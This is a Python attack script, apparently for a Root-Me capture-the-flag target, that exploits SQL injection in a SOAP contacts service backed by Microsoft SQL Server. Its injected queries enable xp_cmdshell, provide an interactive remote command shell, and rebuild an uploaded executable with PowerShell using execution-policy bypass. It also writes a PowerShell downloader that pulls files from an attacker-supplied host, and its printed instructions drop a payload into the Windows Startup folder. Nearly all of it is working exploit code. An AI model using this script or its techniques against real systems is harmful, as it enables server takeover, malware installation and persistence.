import zeep
import random
import ast


# DON'T FORGET TO ENABLE XP_CMDSHELL if ERRORS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# check hosts file to match with ctf0X.root-me.org IP
# change ctf url below :
wsdl = 'http://ctf01.root-me.org/Contacts/ServiceContacts.svc?singleWsdl'
client = zeep.Client(wsdl=wsdl)


while True:
    
    print """
    Bluebox WS client
    =================
    
    Bindings:
    Soap11Binding: {http://tempuri.org/}BasicHttpBinding_IServiceContacts

    Service: ServiceContacts
    Port: BasicHttpBinding_IServiceContacts (Soap11Binding: {http://tempuri.org/}BasicHttpBinding_IServiceContacts)

    Operations:
    [1] PutContact(tb: ContactsTable) -> body: {PutContactResult: xsd:string}, header: {}
    [2] SearchContact(search: xsd:string) -> body: {SearchContactResult: ContactsTable}, header: {}
    [3] Enable xp_cmdshell
    [4] Drop an exe file
    [5] RCE shell
    """

    choice = raw_input('Enter operation id : ')

    if int(choice) == 1:
        contactId = raw_input('ID : ')
        if contactId == 'exit':
            break
        name = raw_input('Name : ')
        email = raw_input('E-Mail : ')
        address = raw_input('Address : ')
        zipcode = raw_input('ZipCode : ')
        city = raw_input('City : ')
        phone = raw_input('Phone : ')
        company = raw_input('Company : ')
            
        print(client.service.PutContact({  
            'ContactAddress': address,
            'ContactCity': city,
            'ContactCompany': company,
            'ContactId': contactId,
            'ContactMail': email,
            'ContactName': name,
            'ContactPhone': phone,
            'ContactZipCode': zipcode
            }))

    if int(choice) == 2:
        while True:
            contact = raw_input('Enter contact : ')
            if contact == 'exit':
                break
            print "\n[Response]"
            print(client.service.SearchContact(contact))
            print "[End of response]\n"

    if int(choice) == 3:
            client.service.SearchContact("a\'; EXEC sp_configure \'show advanced options\', 1; --+")
            client.service.SearchContact("a\'; RECONFIGURE; --+")
            client.service.SearchContact("a\'; EXEC sp_configure \'xp_cmdshell\', 1; --+")
            client.service.SearchContact("a\'; RECONFIGURE; --+")

    if int(choice) == 4:
        print """Convert the exe file into PEBytes thanks powershell and put it as CWD/prog.txt :
PS > [byte[]] $hex = get-content -encoding byte -path C:\\temp\evil_payload.exe
PS > [System.IO.File]::WriteAllLines("C:\\temp\hexdump.txt", ([string]$hex))"""
        print ""
        print """Last convert the txt file into an EXE :
PS > [string]$hex = get-content -path C:\\Users\\victim\\Desktop\\hexdump.txt
PS > [Byte[]] $temp = $hex -split ' '
PS > [System.IO.File]::WriteAllBytes("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil_payload.exe", $temp)"""

        
        #n = 1000
        #n = 8000
        with open('prog.txt') as f:
    		fbytes = f.read()
        #bytes_seq = [fbytes[i:i+n] for i in range(0, len(fbytes), n)]
        #bytes_seq2 = fbytes[::5000]

        # delete created files :
        client.service.SearchContact("a\'; EXEC xp_cmdshell \'del c:\\temp\\prog.txt\'; --+")
        client.service.SearchContact("a\'; EXEC xp_cmdshell \'del c:\\temp\\prog.exe\'; --+")        

        #def chunks(s, n):
        #    """Produce `n`-character chunks from `s`."""
        #    for start in range(0, len(s), n):
        #        yield s[start:start+n]

        #for chunk in chunks(fbytes, 1000):
            #print chunk
        #    client.service.SearchContact('a\'; EXEC xp_cmdshell \'echo|set /p=\"' + chunk + '\" >> c:\\temp\\prog.txt\'; --+')

        def batch_gen(data, batch_size):
            for i in range(0, len(data), batch_size):
                yield data[i:i+batch_size]

        for i in batch_gen(fbytes, 200): 
            print i
            client.service.SearchContact('a\'; EXEC xp_cmdshell \'echo|set /p=\"' + i + '\" >> c:\\temp\\prog.txt\'; --+')

        #bytes_seq = []
        #for i in fbytes:
        #    print i
        #    bytes_seq.append(i)
        #print bytes_seq

        #n = 50
        #for i in xrange(n):
        #    print bytes_seq[i]
        #    client.service.SearchContact('a\'; EXEC xp_cmdshell \'echo|set /p=\"' + i + '\" >> c:\\temp\\prog.txt\'; --+')
        

        client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo [string]$hex = get-content -path C:\\temp\\prog.txt > c:\\temp\\upload.ps1\'; --+")
        client.service.SearchContact("a\'; EXEC xp_cmdshell \"echo [Byte[]] $temp = $hex -split ' ' >> c:\\temp\\upload.ps1\"; --+")
        client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo [System.IO.File]::WriteAllBytes(\"C:\\temp\\prog.exe\", $temp) >> c:\\temp\\upload.ps1\'; --+")

        client.service.SearchContact("a\'; EXEC xp_cmdshell \'powershell -ExecutionPolicy Bypass -File c:\\temp\\upload.ps1\'; --+")

        #client.service.SearchContact("a\'; EXEC xp_cmdshell \'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"[string]$hex = get-content -path C:\\temp\\prog.txt\"\'; --+")
        #client.service.SearchContact("a\'; EXEC xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"[Byte[]] $temp = $hex -split " "\"; --+")
        #client.service.SearchContact("a\'; EXEC xp_cmdshell \'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"[System.IO.File]::WriteAllBytes(\"C:\\temp\\prog.exe\", $temp)\"\'; --+")

        # -----------------------------------
        #for fbyte in fbytes:
        #    pebytes = []
        #    pebytes.append(fbyte)

        #pefile = open('pefile.txt', 'w')
        #for pebyte in pebytes:
        #    pefile.write("%s" % pebyte)
        # -----------------------------------

    
    if int(choice) == 5:
        output_file = 'c:\\temp\\outfile' + str(random.randrange(0, 1000)) + '.txt'
        while True:
            print 'To write bat file : bat'
            print 'To upload a file : upload'
            cmd = raw_input('xp_cmdshell => ')
            if cmd == 'exit':
                break
            if cmd == 'bat':
                bat1 = raw_input('bat_shell : ')
                bat2 = raw_input('bat_shell : ')
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo " + bat1 + " > c:\\temp\\s.bat\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo " + bat2 + " >> c:\\temp\\s.bat\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'c:\\temp\\s.bat > " + output_file + "\'; --+")
            if cmd == 'upload':
                print "HTTP Downloader"
                print "The file will be drop as c:\\temp\\<filename>"
                host = raw_input('host :  ')
                port = raw_input('port :  ')
                file = raw_input('file to download :  ')
                outfile = raw_input('outfile name :  ')
        
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $storageDir = $pwd > c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $webclient = New-Object System.Net.WebClient >>c:\\temp\\wget.ps1\'; --+")
                #client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $url = \"http://91.121.157.120/" + file + "\" >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $url = \"http://" + host + ":" + port + "/" + file + "\" >>c:\\temp\\wget.ps1\'; --+")
                #client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $file = \"c:\\temp\\downloaded_file.ext\" >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $file = \"c:\\temp\\" + outfile + "\" >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $webclient.DownloadFile($url,$file) >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'powershell -ExecutionPolicy Bypass -File c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'dir c:\\temp\\" + outfile + " > " + output_file + "\'; --+")
            if cmd == 'upload_url':
                print "Custom HTTP Downloader"
                print "The file will be drop as c:\\temp\\<filename>"
                url = input('url :')
                outfile = raw_input('outfile name :  ')

                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $storageDir = $pwd > c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $webclient = New-Object System.Net.WebClient >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $url = \"http://" + url + "\" >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $file = \"c:\\temp\\" + outfile + "\" >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'echo $webclient.DownloadFile($url,$file) >>c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'powershell -ExecutionPolicy Bypass -File c:\\temp\\wget.ps1\'; --+")
                client.service.SearchContact("a\'; EXEC xp_cmdshell \'dir c:\\temp\\" + outfile + " > " + output_file + "\'; --+")
            else:
                cmd = "a\'; EXEC xp_cmdshell \'" + cmd + " > " + output_file + "\'; --+"
                client.service.SearchContact(cmd)
            client.service.SearchContact("a\'; DROP TABLE mydata; --+")
            client.service.SearchContact("a\'; CREATE TABLE mydata (line varchar(8000)); --+")
            
            #BULK_CMD = "a\'; BULK INSERT mydata FROM \'c:\\temp\\cmdout.txt\' WITH (ROWTERMINATOR = \00, CODEPAGE = 'ACP'); --+"
            bulk_cmd = "a'; BULK INSERT mydata FROM \'" + output_file + "\' WITH (ROWTERMINATOR = '0x00',CODEPAGE = \'ACP\'); --+"
            client.service.SearchContact(bulk_cmd)
            #client.service.SearchContact("a'; BULK INSERT mydata FROM \'c:\\temp\\cmdoutput1.txt\' WITH (ROWTERMINATOR = '0x00',CODEPAGE = \'ACP\'); --+")
            #client.service.SearchContact("a\'; BULK INSERT mydata FROM 'c:\\temp\\cmdout.txt'; --+")
            
            #print(client.service.SearchContact("a\' union select \'1\',\'2\',\'3\',\'4\',line,\'6\',\'7\',\'8\',\'9\' FROM mydata; --+"))
            res = str(client.service.SearchContact("a\' union select \'1\',\'2\',\'3\',\'4\',line,\'6\',\'7\',\'8\',\'9\' FROM mydata; --+"))
            res = ast.literal_eval(res)

            for key, value in res.iteritems():
                if key == 'ContactAddress':
                    print value

